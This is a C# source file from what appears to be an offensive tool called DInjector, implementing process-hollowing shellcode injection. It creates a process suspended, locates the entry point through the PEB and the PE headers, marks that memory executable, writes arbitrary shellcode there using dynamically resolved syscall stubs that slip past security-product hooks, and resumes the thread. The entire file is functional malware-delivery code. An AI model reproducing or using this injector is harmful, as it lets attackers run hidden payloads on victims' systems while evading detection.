using System;
using System.Runtime.InteropServices;

using DI = DInvoke;

namespace DInjector
{
    class ProcessHollow
    {
        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate Boolean CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            DI.Data.Win32.Advapi32.CREATION_FLAGS dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO lpStartupInfo,
            out DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION lpProcessInformation);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtQueryInformationProcess(
            IntPtr ProcessHandle,
            DI.Data.Native.PROCESSINFOCLASS ProcessInformationClass,
            ref DI.Data.Native.PROCESS_BASIC_INFORMATION ProcessInformation,
            uint ProcessInformationLength,
            ref uint ReturnLength);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtReadVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint NumberOfBytesToRead,
            ref uint NumberOfBytesReaded);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtProtectVirtualMemory(
            IntPtr ProcessHandle,
            ref IntPtr BaseAddress,
            ref IntPtr RegionSize,
            uint NewProtect,
            out uint OldProtect);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtWriteVirtualMemory(
            IntPtr ProcessHandle,
            IntPtr BaseAddress,
            IntPtr Buffer,
            uint BufferLength,
            ref uint BytesWritten);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        delegate DI.Data.Native.NTSTATUS NtResumeThread(
            IntPtr ThreadHandle,
            ref uint SuspendCount);

        public static void Execute(byte[] shellcodeBytes, string processImage)
        {
            var shellcode = shellcodeBytes;

            #region CreateProcessA

            IntPtr pointer = DI.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
            CreateProcess dCreateProcess = (CreateProcess)Marshal.GetDelegateForFunctionPointer(pointer, typeof(CreateProcess));

            DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO si = new DI.Data.Win32.ProcessThreadsAPI._STARTUPINFO();
            DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION pi = new DI.Data.Win32.ProcessThreadsAPI._PROCESS_INFORMATION();

            bool result = dCreateProcess(
                processImage,
                null,
                IntPtr.Zero,
                IntPtr.Zero,
                false,
                DI.Data.Win32.Advapi32.CREATION_FLAGS.CREATE_SUSPENDED,
                IntPtr.Zero,
                null,
                ref si,
                out pi);

            if (result)
            {
                Console.WriteLine("(ProcessHollow) [+] CreateProcess");
            }
            else
            {
                Console.WriteLine("(ProcessHollow) [-] CreateProcess");
            }

            #endregion

            #region NtQueryInformationProcess

            IntPtr stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtQueryInformationProcess");
            NtQueryInformationProcess sysNtQueryInformationProcess = (NtQueryInformationProcess)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtQueryInformationProcess));

            IntPtr hProcess = pi.hProcess;
            DI.Data.Native.PROCESS_BASIC_INFORMATION bi = new DI.Data.Native.PROCESS_BASIC_INFORMATION();
            uint returnLength = 0;
            DI.Data.Native.NTSTATUS ntstatus;

            // Query created process to extract its base address pointer from PEB (Process Environment Block)
            ntstatus = sysNtQueryInformationProcess(
                hProcess,
                DI.Data.Native.PROCESSINFOCLASS.ProcessBasicInformation,
                ref bi,
                (uint)(IntPtr.Size * 6),
                ref returnLength);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ProcessHollow) [+] NtAllocateVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(ProcessHollow) [-] NtAllocateVirtualMemory: {ntstatus}");
            }

            #endregion

            #region NtReadVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtReadVirtualMemory");
            NtReadVirtualMemory sysNtReadVirtualMemory = (NtReadVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtReadVirtualMemory));

            // Pointer to the base address of the EXE image: BASE_ADDR_PTR = PEB_ADDR + 0x10
            IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebBaseAddress + 0x10);
            IntPtr baseAddress = Marshal.AllocHGlobal(IntPtr.Size);

            uint bytesRead = 0;

            // Read 8 bytes of memory (IntPtr.Size is 8 bytes for x64) pointed by the image base address pointer (ptrImageBaseAddress) in order to get the actual value of the image base address
            ntstatus = sysNtReadVirtualMemory(
                hProcess,
                ptrImageBaseAddress,
                baseAddress,
                (uint)IntPtr.Size,
                ref bytesRead);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ProcessHollow) [+] NtReadVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(ProcessHollow) [-] NtReadVirtualMemory: {ntstatus}");
            }

            byte[] baseAddressBytes = new byte[bytesRead];
            Marshal.Copy(baseAddress, baseAddressBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(baseAddress);

            // We're got bytes as a result of memory read, then converted them to Int64 and casted to IntPtr
            IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));
            IntPtr data = Marshal.AllocHGlobal(0x200);

            // Read 0x200 bytes of the loaded EXE image and parse PE structure to get the EntryPoint address
            ntstatus = sysNtReadVirtualMemory(
                hProcess,
                imageBaseAddress,
                data,
                0x200,
                ref bytesRead);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ProcessHollow) [+] NtReadVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(ProcessHollow) [-] NtReadVirtualMemory: {ntstatus}");
            }

            byte[] dataBytes = new byte[bytesRead];
            Marshal.Copy(data, dataBytes, 0, (int)bytesRead);
            Marshal.FreeHGlobal(data);

            // "e_lfanew" field (4 bytes, UInt32; contains the offset for the PE header): e_lfanew = BASE_ADDR + 0x3C
            uint e_lfanew = BitConverter.ToUInt32(dataBytes, 0x3C);
            // EntryPoint RVA (Relative Virtual Address) offset: ENTRYPOINT_RVA_OFFSET = e_lfanew + 0x28
            uint entrypointRvaOffset = e_lfanew + 0x28;
            // EntryPoint RVA (4 bytes, UInt32; contains the offset for the executable EntryPoint address): ENTRYPOINT_RVA = BASE_ADDR + ENTRYPOINT_RVA_OFFSET
            uint entrypointRva = BitConverter.ToUInt32(dataBytes, (int)entrypointRvaOffset);
            // Absolute address of the executable EntryPoint: ENTRYPOINT_ADDR = BASE_ADDR + ENTRYPOINT_RVA
            IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

            #endregion

            #region NtProtectVirtualMemory (PAGE_EXECUTE_READWRITE)

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtProtectVirtualMemory");
            NtProtectVirtualMemory sysNtProtectVirtualMemory = (NtProtectVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtProtectVirtualMemory));

            IntPtr protectAddress = entrypointAddress;
            IntPtr regionSize = (IntPtr)shellcode.Length;
            uint oldProtect = 0;

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                DI.Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
                out oldProtect);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ProcessHollow) [+] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE");
            }
            else
            {
                Console.WriteLine($"(ProcessHollow) [-] NtProtectVirtualMemory, PAGE_EXECUTE_READWRITE: {ntstatus}");
            }

            #endregion

            #region NtWriteVirtualMemory

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtWriteVirtualMemory");
            NtWriteVirtualMemory sysNtWriteVirtualMemory = (NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtWriteVirtualMemory));

            var buffer = Marshal.AllocHGlobal(shellcode.Length);
            Marshal.Copy(shellcode, 0, buffer, shellcode.Length);

            uint bytesWritten = 0;

            // Write the shellcode to the EntryPoint address
            ntstatus = sysNtWriteVirtualMemory(
                hProcess,
                entrypointAddress,
                buffer,
                (uint)shellcode.Length,
                ref bytesWritten);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ProcessHollow) [+] NtWriteVirtualMemory");
            }
            else
            {
                Console.WriteLine($"(ProcessHollow) [-] NtWriteVirtualMemory: {ntstatus}");
            }

            #endregion

            #region NtProtectVirtualMemory (oldProtect)

            ntstatus = sysNtProtectVirtualMemory(
                hProcess,
                ref protectAddress,
                ref regionSize,
                oldProtect,
                out uint _);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ProcessHollow) [+] NtProtectVirtualMemory, oldProtect");
            }
            else
            {
                Console.WriteLine($"(ProcessHollow) [-] NtProtectVirtualMemory, oldProtect: {ntstatus}");
            }

            #endregion

            #region NtResumeThread

            stub = DI.DynamicInvoke.Generic.GetSyscallStub("NtResumeThread");
            NtResumeThread sysNtResumeThread = (NtResumeThread)Marshal.GetDelegateForFunctionPointer(stub, typeof(NtResumeThread));

            uint suspendCount = 0;

            ntstatus = sysNtResumeThread(
                pi.hThread,
                ref suspendCount);

            if (ntstatus == 0)
            {
                Console.WriteLine("(ProcessHollow) [+] NtResumeThread");
            }
            else
            {
                Console.WriteLine($"(ProcessHollow) [-] NtResumeThread: {ntstatus}");
            }

            #endregion
        }
    }
}
